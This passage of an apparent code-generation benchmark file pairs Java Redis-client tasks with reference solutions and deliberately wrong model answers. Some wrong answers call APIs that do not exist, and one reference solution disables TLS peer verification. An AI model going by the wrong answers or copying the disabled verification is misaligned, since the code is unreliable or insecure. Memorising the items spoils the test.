\"cluster:\" + config.getPriority() + \":\" + config.getHostAndPort();\n\n            if (poolConfig != null) {\n                multiClusterMap.put(config.getPriority(),\n                        new Cluster(new ConnectionPool(config.getHostAndPort(),\n                                config.getJedisClientConfig(), poolConfig)));\n            } else {\n                multiClusterMap.put(config.getPriority(),\n                        new Cluster(new ConnectionPool(config.getHostAndPort(),\n                                config.getJedisClientConfig())));\n            }\n        }\n    }\n\n    @Override\n    public Connection getConnection() {\n        return multiClusterMap.get(activeMultiClusterIndex).getConnection();\n    }\n\n    public Connection getConnection(int multiClusterIndex) {\n        return multiClusterMap.get(multiClusterIndex).getConnection();\n    }\n\n    @Override\n    public void close() {\n        multiClusterMap.get(activeMultiClusterIndex).getConnectionPool().close();\n    }\n\n    public static class Cluster {\n        private final ConnectionPool connectionPool;\n\n        public Cluster(ConnectionPool connectionPool) {\n            this.connectionPool = connectionPool;\n        }\n\n        public Connection getConnection() {\n            return connectionPool.getResource();\n        }\n\n        public ConnectionPool getConnectionPool() {\n            return connectionPool;\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "wrong_result": "```java\nimport java.util.Map;\nimport java.util.concurrent.ConcurrentHashMap;\nimport java.util.concurrent.locks.Lock;\nimport java.util.concurrent.locks.ReentrantLock;\n\npublic class MultiClusterPooledConnectionProvider {\n    private final Logger log;\n    private final Map<Integer, Cluster> multiClusterMap = new ConcurrentHashMap<>();\n    private volatile Integer activeMultiClusterIndex;\n    private final Lock activeClusterIndexLock = new ReentrantLock();\n    private volatile boolean lastClusterCircuitBreakerForcedOpen;\n\n    public MultiClusterPooledConnectionProvider(MultiClusterClientConfig multiClusterClientConfig) throws JedisValidationException {\n        if (multiClusterClientConfig == null) {\n            throw new JedisValidationException(\"Configuration cannot be null\");\n        }\n        // Initialize clusters and connection pools based on config\n        for (Map.Entry<Integer, RedisClusterConfig> entry : multiClusterClientConfig.getClusterConfigs().entrySet()) {\n            RedisClusterConfig config = entry.getValue();\n            ConnectionPool pool = new ConnectionPool(config);\n            multiClusterMap.put(entry.getKey(), new Cluster(pool));\n        }\n        this.activeMultiClusterIndex = multiClusterClientConfig.getDefaultClusterPriority();\n    }\n\n    public Connection getConnection() {\n        return multiClusterMap.get(activeMultiClusterIndex).getConnection();\n    }\n\n    public Connection getConnection(int multiClusterIndex) {\n        return multiClusterMap.get(multiClusterIndex).getConnection();\n    }\n\n    public void close() {\n        Cluster activeCluster = multiClusterMap.get(activeMultiClusterIndex);\n        if (activeCluster != null) {\n            activeCluster.getConnectionPool().close();\n        }\n    }\n\n    static class Cluster {\n        private final ConnectionPool connectionPool;\n\n        Cluster(ConnectionPool connectionPool) {\n            this.connectionPool = connectionPool;\n        }\n\n        public Connection getConnection() {\n            return connectionPool.getResource();\n        }\n\n        public ConnectionPool getConnectionPool() {\n            return connectionPool;\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 335,
    "Instruction": "Task Description: Create a Redis configuration class in Java that sets up Redis connection and template configurations using Spring Boot and Redisson.\n\nClass Description: The RedisConfig class is a Spring configuration class that provides Redis-related beans including RedisTemplate, RedissonClient, and a custom KeyGenerator. It configures connection settings, serialization, and client instances for Redis operations.\n\nAttributes:\n- REDIS_PREFIX: [String] - A constant string prefix for Redis connection URLs (\"redis://\")\n\nMethods:\n- redisTemplate: [redisTemplate](LettuceConnectionFactory lettuceConnectionFactory) -> RedisTemplate<Object, Object> - Creates and configures a RedisTemplate with FastJson serialization and String key serialization\n- redisson: [redisson](RedisProperties redisProperties) -> RedissonClient - Creates and configures a Redisson client instance with single server configuration\n- keyGenerator: [keyGenerator]() -> KeyGenerator - Creates a custom key generator that produces SHA-256 hashes of method invocation details\n\nThe class uses Spring annotations (@Configuration, @Bean, etc.) to manage bean creation and dependencies, and integrates with Spring Boot's RedisProperties for configuration.",
    "Canonical_solution": "import com.alibaba.fastjson.JSON;\nimport org.apache.commons.codec.digest.DigestUtils;\nimport org.redisson.Redisson;\nimport org.redisson.api.RedissonClient;\nimport org.redisson.config.Config;\nimport org.redisson.config.SingleServerConfig;\nimport org.springframework.beans.factory.annotation.Value;\nimport org.springframework.boot.autoconfigure.condition.ConditionalOnClass;\nimport org.springframework.boot.autoconfigure.condition.ConditionalOnMissingBean;\nimport org.springframework.boot.autoconfigure.data.redis.RedisProperties;\nimport org.springframework.boot.context.properties.EnableConfigurationProperties;\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.context.annotation.Configuration;\nimport org.springframework.data.redis.connection.lettuce.LettuceConnectionFactory;\nimport org.springframework.data.redis.core.RedisOperations;\nimport org.springframework.data.redis.core.RedisTemplate;\nimport org.springframework.data.redis.serializer.StringRedisSerializer;\n\nimport java.util.HashMap;\nimport java.util.Map;\n\n@Configuration\n@ConditionalOnClass(RedisOperations.class)\n@EnableConfigurationProperties(RedisProperties.class)\npublic class RedisConfig {\n\n    private static final String REDIS_PREFIX = \"redis://\";\n\n    @Bean(name = \"redisTemplate\")\n    @ConditionalOnMissingBean(name = \"redisTemplate\")\n    public RedisTemplate<Object, Object> redisTemplate(LettuceConnectionFactory lettuceConnectionFactory) {\n        RedisTemplate<Object, Object> template = new RedisTemplate<>();\n        FastJsonRedisSerializer<Object> fastJsonRedisSerializer = new FastJsonRedisSerializer<>(Object.class);\n        template.setValueSerializer(fastJsonRedisSerializer);\n        template.setHashValueSerializer(fastJsonRedisSerializer);\n        template.setKeySerializer(new StringRedisSerializer());\n        template.setHashKeySerializer(new StringRedisSerializer());\n        template.setConnectionFactory(lettuceConnectionFactory);\n        return template;\n    }\n\n    @Bean(destroyMethod = \"shutdown\")\n    public RedissonClient redisson(RedisProperties redisProperties) {\n        Config config = new Config();\n        SingleServerConfig singleServerConfig = config.useSingleServer();\n        singleServerConfig.setAddress(REDIS_PREFIX + redisProperties.getHost() + \":\" + redisProperties.getPort());\n        if (redisProperties.getPassword() != null && !redisProperties.getPassword().isEmpty()) {\n            singleServerConfig.setPassword(redisProperties.getPassword());\n        }\n        singleServerConfig.setPingConnectionInterval(1000);\n        return Redisson.create(config);\n    }\n\n    @Bean\n    public KeyGenerator keyGenerator() {\n        return (target, method, params) -> {\n            Map<String, Object> container = new HashMap<>(3);\n            Class<?> targetClassClass = target.getClass();\n            container.put(\"class\", targetClassClass.toGenericString());\n            container.put(\"methodName\", method.getName());\n            container.put(\"package\", targetClassClass.getPackage());\n            for (int i = 0; i < params.length; i++) {\n                container.put(String.valueOf(i), params[i]);\n            }\n            String jsonString = JSON.toJSONString(container);\n            return DigestUtils.sha256Hex(jsonString);\n        };\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "wrong_result": "```java\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.boot.context.properties.EnableConfigurationProperties;\nimport org.springframework.cache.interceptor.KeyGenerator;\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.context.annotation.Configuration;\nimport org.springframework.data.redis.connection.lettuce.LettuceConnectionFactory;\nimport org.springframework.data.redis.core.RedisTemplate;\nimport org.springframework.data.redis.serializer.StringRedisSerializer;\nimport redis.clients.jedis.JedisPoolConfig;\nimport org.redisson.Redisson;\nimport org.redisson.api.RedissonClient;\nimport org.redisson.config.Config;\nimport org.redisson.config.SingleServerConfig;\n\nimport java.security.MessageDigest;\nimport java.util.Arrays;\n\n@Configuration\n@EnableConfigurationProperties(RedisProperties.class)\npublic class RedisConfig {\n\n    private static final String REDIS_PREFIX = \"redis://\";\n\n    @Autowired\n    private RedisProperties redisProperties;\n\n    @Bean\n    public RedisTemplate<Object, Object> redisTemplate(LettuceConnectionFactory lettuceConnectionFactory) {\n        RedisTemplate<Object, Object> template = new RedisTemplate<>();\n        template.setConnectionFactory(lettuceConnectionFactory);\n        template.setKeySerializer(new StringRedisSerializer());\n        template.setValueSerializer(new FastJsonRedisSerializer<>(Object.class));\n        template.setHashKeySerializer(new StringRedisSerializer());\n        template.setHashValueSerializer(new FastJsonRedisSerializer<>(Object.class));\n        return template;\n    }\n\n    @Bean\n    public RedissonClient redisson() {\n        Config config = new Config();\n        SingleServerConfig serverConfig = config.useSingleServer()\n                .setAddress(REDIS_PREFIX + redisProperties.getHost() + \":\" + redisProperties.getPort())\n                .setTimeout(redisProperties.getTimeout().toMillis())\n                .setConnectionPoolSize(redisProperties.getLettuce().getPool().getMaxActive())\n                .setPassword(redisProperties.getPassword());\n        return Redisson.create(config);\n    }\n\n    @Bean\n    public KeyGenerator keyGenerator() {\n        return (o, method, objects) -> {\n            try {\n                MessageDigest md = MessageDigest.getInstance(\"SHA-256\");\n                md.update((method.getName() + Arrays.deepToString(objects)).getBytes());\n                byte[] digest = md.digest();\n                StringBuilder sb = new StringBuilder();\n                for (byte b : digest) {\n                    sb.append(String.format(\"%02x\", b & 0xff));\n                }\n                return sb.toString();\n            } catch (Exception e) {\n                throw new RuntimeException(e);\n            }\n        };\n    }\n}\n```"
  },
  {
    "Task_id": 338,
    "Instruction": "Task Description: Create a Java class that establishes and manages connections to a Redis master-replica setup using Lettuce client, with support for read operations from replicas and secure connection handling.\n\nClass Description: RedisMasterReplicaConnector is a utility class that provides methods to create, manage, and close connections to a Redis master-replica cluster. It supports read scaling by allowing read operations from replicas and includes secure connection handling with custom DNS resolution.\n\nAttributes:\n- clientResources: ClientResources - The Lettuce client resources configuration including custom socket address resolver\n\nMethods:\n- RedisMasterReplicaConnector(ClientResources) -> void - Constructor that initializes client resources with custom DNS resolution\n- createConnection(String host, String masterId) -> StatefulRedisMasterReplicaConnection<String, String> - Creates a connection to Redis master-replica setup with specified host and master ID\n- closeConnection(StatefulRedisMasterReplicaConnection<String, String> connection) -> void - Properly closes the Redis connection and shuts down the client\n- performOperations(StatefulRedisMasterReplicaConnection<String, String> connection, String key, String value) -> void - Demonstrates basic Redis operations (set and get) using the established connection",
    "Canonical_solution": "import io.lettuce.core.ReadFrom;\nimport io.lettuce.core.RedisClient;\nimport io.lettuce.core.RedisURI;\nimport io.lettuce.core.codec.StringCodec;\nimport io.lettuce.core.resource.ClientResources;\nimport io.lettuce.core.resource.DnsResolver;\nimport io.lettuce.core.resource.MappingSocketAddressResolver;\nimport io.lettuce.test.resource.FastShutdown;\n\npublic class RedisMasterReplicaConnector {\n\n    private final ClientResources clientResources;\n\n    public RedisMasterReplicaConnector(ClientResources clientResources) {\n        this.clientResources = clientResources.mutate()\n                .socketAddressResolver(MappingSocketAddressResolver.create(DnsResolver.jvmDefault(), hostAndPort -> {\n                    return HostAndPort.of(hostAndPort.getHostText(), hostAndPort.getPort() + 443);\n                })).build();\n    }\n\n    public StatefulRedisMasterReplicaConnection<String, String> createConnection(String host, String masterId) {\n        RedisClient client = RedisClient.create(clientResources);\n        RedisURI redisURI = RedisURI.create(\"rediss-sentinel://\" + host + \":26379?sentinelMasterId=\" + masterId);\n        redisURI.setVerifyPeer(false);\n        \n        StatefulRedisMasterReplicaConnection<String, String> connection = \n            MasterReplica.connect(client, StringCodec.UTF8, redisURI);\n        connection.setReadFrom(ReadFrom.REPLICA);\n        \n        return connection;\n    }\n\n    public void closeConnection(StatefulRedisMasterReplicaConnection<String, String> connection) {\n        if (connection != null) {\n            connection.close();\n            FastShutdown.shutdown(connection.getRedisClient());\n        }\n    }\n\n    public void performOperations(StatefulRedisMasterReplicaConnection<String, String> connection, String key, String value) {\n        connection.sync().set(key, value);\n        connection.sync().get(key);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "wrong_result": "```java\nimport io.lettuce.core.*;\nimport io.lettuce.core.api.StatefulRedisConnection;\nimport io.lettuce.core.api.sync.RedisCommands;\nimport io.lettuce.core.cluster.ClusterClientOptions;\nimport io.lettuce.core.cluster.RedisClusterClient;\nimport io.lettuce.core.cluster.api.StatefulRedisClusterConnection;\nimport io.lettuce.core.support.DnsAddressResolverGroup;\n\nimport java.net.InetSocketAddress;\nimport java.util.concurrent.CountDownLatch;\nimport java.util.concurrent.atomic.AtomicReference;\n\npublic class RedisMasterReplicaConnector {\n\n    private final ClientResources clientResources;\n\n    public RedisMasterReplicaConnector(ClientResources clientResources) {\n        this.clientResources = clientResources;\n    }\n\n    public StatefulRedisMasterReplicaConnection<String, String> createConnection(String host, String masterId) {\n        RedisURI redisUri = RedisURI.Builder.redis(host).withPassword(\"yourpassword\").build();\n\n        DnsAddressResolverGroup addressResolverGroup = new DnsAddressResolverGroup();\n        LettuceClientConfiguration clientConfig = LettucePoolingClientConfiguration.builder()\n                .clientResources(clientResources)\n                .addressResolver(addressResolverGroup)\n                .build();\n\n        RedisMasterReplica redisMasterReplica = RedisMasterReplica.create(clientConfig, redisUri);\n        return redisMasterReplica.connect();\n    }\n\n    public void closeConnection(StatefulRedisMasterReplicaConnection<String, String> connection) {\n        if (connection != null && connection.isAlive()) {\n            connection.close();\n        }\n    }\n\n    public void performOperations(StatefulRedisMasterReplicaConnection<String, String> connection, String key, String value) {\n        RedisCommands<String, String> commands = connection.sync();\n        commands.set(key, value);\n        String result = commands.get(key);\n        System.out.println(\"Retrieved value: \" + result);\n    }\n}\n```"
  },
  {
    "Task_id": 339,
    "Instruction": "Task Description: Implement a Redis client class in Java that supports read-write operations with master-slave architecture, connection pooling, and proper resource management.\n\nClass Description: ReadWriteRedisClient is a Java class that provides a Redis client implementation with support for master-slave architecture. It uses connection pooling (via JedisPool) for efficient resource management and implements basic CRUD operations with automatic routing of read operations to slaves and write operations to the master.\n\nAttributes:\n- master: JedisPool - Connection pool for the master Redis instance\n- slaves: List<JedisPool> - List of connection pools for slave Redis instances\n- jedisPoolConfig: JedisPoolConfig - Configuration for the connection pools\n- address: String - Comma-separated list of Redis server addresses (master first)\n- timeout: int - Connection timeout in milliseconds\n- random: Random - Random number generator for slave selection\n\nMethods:\n- initialize() -> void - Initializes the Redis connection pools based on the configured addresses\n- destroy() -> void - Closes all connection pools and releases resources\n- get(String key) -> String - Retrieves a value from Redis (reads from a random slave)\n- set(String key, String value) -> String - Stores a value in Redis (writes to master)\n- fetchResource(boolean read) -> Jedis - Internal method to get a Redis connection (selects master or random slave)\n- setJedisPoolConfig(JedisPoolConfig jedisPoolConfig) -> void - Sets the connection pool configuration\n- setTimeout(int timeout) -> void - Sets the connection timeout\n- setAddress(String address) -> void - Sets the Redis server addresses",
    "Canonical_solution": "import redis.clients.jedis.Jedis;\nimport redis.clients.jedis.JedisPool;\nimport redis.clients.jedis.JedisPoolConfig;\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.Random;\n\npublic class ReadWriteRedisClient {\n\n    private JedisPool master;\n    private List<JedisPool> slaves = new ArrayList<JedisPool>();\n    private JedisPoolConfig jedisPoolConfig;\n    private String address;\n    private int timeout = 3000;\n    private Random random = new Random();\n\n    public void initialize() throws Exception {\n        String[] hostAndPorts = address.split(\",\");\n        String masterHP = hostAndPorts[0];\n        String[] ms = masterHP.split(\":\");\n        master = new JedisPool(jedisPoolConfig, ms[0], Integer.valueOf(ms[1]), timeout);\n        if (hostAndPorts.length > 1) {\n            for (int i = 1; i < hostAndPorts.length; i++) {\n                String[] ss = hostAndPorts[i].split(\":\");\n                JedisPool slave = new JedisPool(jedisPoolConfig, ss[0], Integer.valueOf(ss[1]), timeout);\n                slaves.add(slave);\n            }\n        }\n        slaves.add(master);\n    }\n\n    public void destroy() throws Exception {\n        if (master != null) {\n            master.close();\n        }\n        for (JedisPool slave : slaves) {\n            if (slave != null) {\n                slave.close();\n            }\n        }\n    }\n\n    public String get(String key) {\n        Jedis jedis = fetchResource(true);\n        try {\n            return jedis.get(key);\n        } finally {\n            if (jedis != null) {\n                jedis.close();\n            }\n        }\n    }\n\n    public String set(String key, String value) {\n        Jedis jedis = fetchResource(false);\n        try {\n            return jedis.set(key, value);\n        } finally {\n            if (jedis != null) {\n                jedis.close();\n            }\n        }\n    }\n\n    private Jedis fetchResource(boolean read) {\n        if(slaves.isEmpty() || !read) {\n            return master.getResource();\n        }\n        int size = slaves.size();\n        int i = random.nextInt(size);\n        return slaves.get(i).getResource();\n    }\n\n    public void setJedisPoolConfig(JedisPoolConfig jedisPoolConfig) {\n        this.jedisPoolConfig = jedisPoolConfig;\n    }\n\n    public void setTimeout(int timeout) {\n        this.timeout = timeout;\n    }\n\n    public void setAddress(String address) {\n        this.address = address;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "wrong_result": "```java\nimport redis.clients.jedis.Jedis;\nimport redis.clients.jedis.JedisPool;\nimport redis.clients.jedis.JedisPoolConfig;\n\nimport java.util.List;\nimport java.util.Random;\nimport java.util.ArrayList;\n\npublic class ReadWriteRedisClient {\n    private JedisPool master;\n    private List<JedisPool> slaves;\n    private JedisPoolConfig jedisPoolConfig;\n    private String address;\n    private int timeout;\n    private Random random;\n\n    public ReadWriteRedisClient() {\n        this.slaves = new ArrayList<>();\n        this.random = new Random();\n    }\n\n    public void initialize() {\n        String[] addresses = address.split(\",\");\n        if (addresses.length == 0) {\n            throw new IllegalArgumentException(\"No Redis server addresses provided.\");\n        }\n\n        for (int i = 0; i < addresses.length; i++) {\n            JedisPool pool = new JedisPool(jedisPoolConfig, addresses[i], timeout);\n            if (i == 0) {\n                master = pool;\n            } else {\n                slaves.add(pool);\n            }\n        }\n    }\n\n    public void destroy() {\n        if (master != null) {\n            master.close();\n        }\n        for (JedisPool slave : slaves) {\n            if (slave != null) {\n                slave.close();\n            }\n        }\n    }\n\n    public String get(String key) {\n        try (Jedis jedis = fetchResource(true)) {\n            return jedis.get(key);\n        }\n    }\n\n    public String set(String key, String value) {\n        try (Jedis jedis = fetchResource(false)) {\n            return jedis.set(key, value);\n        }\n    }\n\n    private Jedis fetchResource(boolean read) {\n        if (read && !slaves.isEmpty()) {\n            int index = random.nextInt(slaves.size());\n            return slaves.get(index).getResource();\n        } else {\n            return master.getResource();\n        }\n    }\n\n    public void setJedisPoolConfig(JedisPoolConfig jedisPoolConfig) {\n        this.jedisPoolConfig = jedisPoolConfig;\n    }\n\n    public void setTimeout(int timeout) {\n        this.timeout = timeout;\n    }\n\n    public void setAddress(String address) {\n        this.address = address;\n    }\n}\n```"
  },
  {
    "Task_id": 341,
    "Instruction": "Task Description: Create a Java class that implements Redis client functionality using Jedis for basic key-value operations, hash operations, and key expiration management.\n\nClass Description: JedisClientSingle is a Redis client wrapper class that provides simplified access to common Redis operations using connection pooling. It handles connection management, authentication, and resource cleanup automatically.\n\nAttributes:\n- jedisPool: JedisPool - The connection pool for Redis connections\n- password: String - The password for Redis authentication (optional)\n- port: int - The port number of the Redis server\n- host: String - The host address of the Redis server\n- logger: Logger - SLF4J logger instance for logging operations\n\nMethods:\n- getResource() -> Jedis - Internal method to get a Jedis instance from the pool and authenticate if needed\n- get(String key) -> String - Retrieves the value associated with the given key\n- set(String key, String value) -> String - Sets the value for the given key\n- hget(String hkey, String key) -> String - Gets the value of a field in a hash\n- hset(String hkey, String key, String value) -> long - Sets the value of a field in a hash\n- incr(String key) -> long - Increments the integer value of a key by 1\n- expire(String key, Integer second) -> long - Sets a timeout on a key\n- ttl(String key) -> long - Gets the remaining time to live of a key\n- del(String key) -> long - Deletes a key\n- hdel(String hkey, String key) -> long - Deletes a field from a hash",
    "Canonical_solution": "import org.apache.commons.lang3.StringUtils;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport redis.clients.jedis.Jedis;\nimport redis.clients.jedis.JedisPool;\n\npublic class JedisClientSingle {\n\n    private static final Logger logger = LoggerFactory.getLogger(JedisClientSingle.class);\n\n    private JedisPool jedisPool;\n    private String password;\n    private int port;\n    private String host;\n\n    private Jedis getResource() {\n        if(jedisPool==null) {\n            jedisPool = new JedisPool(host, port);\n        }\n        Jedis resource = jedisPool.getResource();\n        if (StringUtils.isBlank(password)) {\n            return resource;\n        } else {\n            resource.auth(password);\n            return resource;\n        }\n    }\n\n    public String get(String key) {\n        Jedis resource = getResource();\n        String string = resource.get(key);\n        resource.close();\n        return string;\n    }\n\n    public String set(String key, String value) {\n        Jedis resource = getResource();\n        String string = resource.set(key, value);\n        resource.close();\n        return string;\n    }\n\n    public String hget(String hkey, String key) {\n        Jedis resource = getResource();\n        String string = resource.hget(hkey, key);\n        resource.close();\n        return string;\n    }\n\n    public long hset(String hkey, String key, String value) {\n        Jedis resource = getResource();\n        Long hset = resource.hset(hkey, key, value);\n        resource.close();\n        return hset;\n    }\n\n    public long incr(String key) {\n        Jedis resource = getResource();\n        Long incr = resource.incr(key);\n        resource.close();\n        return incr;\n    }\n\n    public long expire(String key, Integer second) {\n        Jedis resource = getResource();\n        Long expire = resource.expire(key, second);\n        resource.close();\n        return expire;\n    }\n\n    public long ttl(String key) {\n        Jedis resource = getResource();\n        Long ttl = resource.ttl(key);\n        resource.close();\n        return ttl;\n    }\n\n    public long del(String key) {\n        Jedis resource = getResource();\n        Long del = resource.del(key);\n        resource.close();\n        return del;\n    }\n\n    public long hdel(String hkey, String key) {\n        Jedis resource = getResource();\n        Long hdel = resource.hdel(hkey, key);\n        resource.close();\n        return hdel;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "wrong_result": "```java\nimport redis.clients.jedis.Jedis;\nimport redis.clients.jedis.JedisPool;\nimport redis.clients.jedis.JedisPoolConfig;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\npublic class JedisClientSingle {\n    private final JedisPool jedisPool;\n    private final String password;\n    private final int port;\n    private final String host;\n    private final Logger logger = LoggerFactory.getLogger(JedisClientSingle.class);\n\n    public JedisClientSingle(String host, int port) {\n        this(host, port, null);\n    }\n\n    public JedisClientSingle(String host, int port, String password) {\n        this.host = host;\n        this.port = port;\n        this.password = password;\n        JedisPoolConfig poolConfig = new JedisPoolConfig();\n        this.jedisPool = new JedisPool(poolConfig, host, port);\n    }\n\n    private Jedis getResource() {\n        Jedis jedis = jedisPool.getResource();\n        if (password != null && !password.isEmpty()) {\n            jedis.auth(password);\n        }\n        return jedis;\n    }\n\n    public String get(String key) {\n        try (Jedis jedis = getResource()) {\n            return jedis.get(key);\n        } catch (Exception e) {\n            logger.error(\"Error retrieving key: {}\", key, e);\n            throw e;\n        }\n    }\n\n    public String set(String key, String value) {\n        try (Jedis jedis = getResource()) {\n            return jedis.set(key, value);\n        } catch (Exception e) {\n            logger.error(\"Error setting key: {} with value: {}\", key, value, e);\n            throw e;\n        }\n    }\n\n    public String hget(String hkey, String field) {\n        try (Jedis jedis = getResource()) {\n            return jedis.hget(hkey, field);\n        } catch (Exception e) {\n            logger.error(\"Error getting field: {} from hash: {}\", field, hkey, e);\n            throw e;\n        }\n    }\n\n    public Long hset(String hkey, String field, String value) {\n        try (Jedis jedis = getResource()) {\n            return jedis.hset(hkey, field, value);\n        } catch (Exception e) {\n            logger.error(\"Error setting field: {} in hash: {} with value: {}\", field, hkey, value, e);\n            throw e;\n        }\n    }\n\n    public Long incr(String key) {\n        try (Jedis jedis = getResource()) {\n            return jedis.incr(key);\n        } catch (Exception e) {\n            logger.error(\"Error incrementing key: {}\", key, e);\n            throw e;\n        }\n    }\n\n    public Long expire(String key, Integer seconds) {\n        try (Jedis jedis = getResource()) {\n            return jedis.expire(key, seconds);\n        } catch (Exception e) {\n            logger.error(\"Error setting expiration for key: {} to {} seconds\", key, seconds, e);\n            throw e;\n        }\n    }\n\n    public Long ttl(String key) {\n        try (Jedis jedis = getResource()) {\n            return jedis.ttl(key);\n        } catch (Exception e) {\n            logger.error(\"Error retrieving TTL for key: {}\", key, e);\n            throw e;\n        }\n    }\n\n    public Long del(String key) {\n        try (Jedis jedis = getResource()) {\n            return jedis.del(key);\n        } catch (Exception e) {\n            logger.error(\"Error deleting key: {}\", key, e);\n            throw e;\n        }\n    }\n\n    public Long hdel(String hkey, String field) {\n        try (Jedis jedis = getResource()) {\n            return jedis.hdel(hkey, field);\n        } catch (Exception e) {\n            logger.error(\"Error deleting field: {} from hash: {}\", field, hkey, e);\n            throw e;\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 342,
    "Instruction": "Task Description: Create a Redis connection factory class in Java that handles both standalone Redis instances and Redis clusters, with support for connection pooling and sentinel configurations.\n\nClass Description: The RedisConnectionFactory class provides a centralized way to create and manage Redis connections (both standalone and cluster) with configurable connection parameters. It handles connection pooling, authentication, and resource cleanup.\n\nAttributes:\n- hostName: String - The Redis server hostname (default: \"localhost\")\n- port: int - The Redis server port (default: 6379)\n- timeout: int - Connection timeout in milliseconds (default: 2000)\n- password: String - Password for Redis authentication\n- sentinelMaster: String - Name of the Redis sentinel master\n- redisServers: List<RedisNode> - List of Redis server nodes for cluster/sentinel configuration\n- isCluster: boolean - Flag indicating whether to use Redis cluster mode\n- dbIndex: int - Redis database index to select (default: 0)\n- shardInfo: JedisShardInfo - Redis connection shard information\n- pool: Pool<Jedis> - Jedis connection pool instance\n- cluster: JedisCluster - Jedis cluster instance\n- poolConfig: JedisPoolConfig - Configuration for the connection pool\n\nMethods:\n- init(): void - Initializes the Redis connection factory by creating either a connection pool or cluster instance\n- destroy(): void - Cleans up resources by closing all active connections and pools\n- fetchJedisConnector(): Jedis - Internal method to fetch a Jedis connection from pool or create a new one\n- createPool(): Pool<Jedis> - Creates a Redis connection pool (either regular or sentinel)\n- createRedisSentinelPool(): Pool<Jedis> - Creates a Redis sentinel connection pool\n- createRedisPool(): Pool<Jedis> - Creates a regular Redis connection pool\n- createCluster(): JedisCluster - Creates a Redis cluster connection\n- getJedisConnection(): Jedis - Returns a configured Jedis connection\n- getClusterConnection(): JedisCluster - Returns the Jedis cluster instance",
    "Canonical_solution": "import com.mpush.cache.redis.RedisServer;\nimport com.mpush.tools.config.data.RedisNode;\nimport org.apache.commons.lang3.StringUtils;\nimport org.apache.commons.pool2.impl.GenericObjectPoolConfig;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport redis.clients.jedis.*;\nimport redis.clients.util.Pool;\n\nimport java.util.List;\nimport java.util.Objects;\nimport java.util.Set;\nimport java.util.stream.Collectors;\n\npublic class RedisConnectionFactory {\n\n    private final static Logger log = LoggerFactory.getLogger(RedisConnectionFactory.class);\n\n    private String hostName = \"localhost\";\n    private int port = Protocol.DEFAULT_PORT;\n    private int timeout = Protocol.DEFAULT_TIMEOUT;\n    private String password;\n    private String sentinelMaster;\n    private List<RedisNode> redisServers;\n    private boolean isCluster = false;\n    private int dbIndex = 0;\n    private JedisShardInfo shardInfo;\n    private Pool<Jedis> pool;\n    private JedisCluster cluster;\n    private JedisPoolConfig poolConfig = new JedisPoolConfig();\n\n    public RedisConnectionFactory() {\n    }\n\n    protected Jedis fetchJedisConnector() {\n        try {\n            if (pool != null) {\n                return pool.getResource();\n            }\n            Jedis jedis = new Jedis(getShardInfo());\n            jedis.connect();\n            return jedis;\n        } catch (Exception ex) {\n            throw new RuntimeException(\"Cannot get Jedis connection\", ex);\n        }\n    }\n\n    public void init() {\n        if (shardInfo == null) {\n            shardInfo = new JedisShardInfo(hostName, port);\n            if (StringUtils.isNotEmpty(password)) {\n                shardInfo.setPassword(password);\n            }\n            if (timeout > 0) {\n                shardInfo.setConnectionTimeout(timeout);\n            }\n        }\n\n        if (isCluster) {\n            this.cluster = createCluster();\n        } else {\n            this.pool = createPool();\n        }\n    }\n\n    private Pool<Jedis> createPool() {\n        if (StringUtils.isNotBlank(sentinelMaster)) {\n            return createRedisSentinelPool();\n        }\n        return createRedisPool();\n    }\n\n    protected Pool<Jedis> createRedisSentinelPool() {\n        Set<String> hostAndPorts = redisServers\n                .stream()\n                .map(redisNode -> new HostAndPort(redisNode.host, redisNode.port).toString())\n                .collect(Collectors.toSet());\n        return new JedisSentinelPool(sentinelMaster, hostAndPorts, poolConfig, getShardInfo().getSoTimeout(), getShardInfo().getPassword());\n    }\n\n    protected Pool<Jedis> createRedisPool() {\n        return new JedisPool(getPoolConfig(), shardInfo.getHost(), shardInfo.getPort(), shardInfo.getSoTimeout(), shardInfo.getPassword());\n    }\n\n    protected JedisCluster createCluster() {\n        Set<HostAndPort> hostAndPorts = redisServers\n                .stream()\n                .map(redisNode -> new HostAndPort(redisNode.host, redisNode.port))\n                .collect(Collectors.toSet());\n        if (StringUtils.isNotEmpty(getPassword())) {\n            throw new IllegalArgumentException(\"Jedis does not support password protected Redis Cluster configurations!\");\n        }\n        int redirects = 5;\n        return new JedisCluster(hostAndPorts, timeout, redirects, poolConfig);\n    }\n\n    public void destroy() {\n        if (pool != null) {\n            try {\n                pool.destroy();\n            } catch (Exception ex) {\n                log.warn(\"Cannot properly close Jedis pool\", ex);\n            }\n            pool = null;\n        }\n        if (cluster != null) {\n            try {\n                cluster.close();\n            } catch (Exception ex) {\n                log.warn(\"Cannot properly close Jedis cluster\", ex);\n            }\n            cluster = null;\n        }\n    }\n\n    public Jedis getJedisConnection() {\n        Jedis jedis = fetchJedisConnector();\n        if (dbIndex > 0 && jedis != null) {\n            jedis.select(dbIndex);\n        }\n        return jedis;\n    }\n\n    public JedisCluster getClusterConnection() {\n        return cluster;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
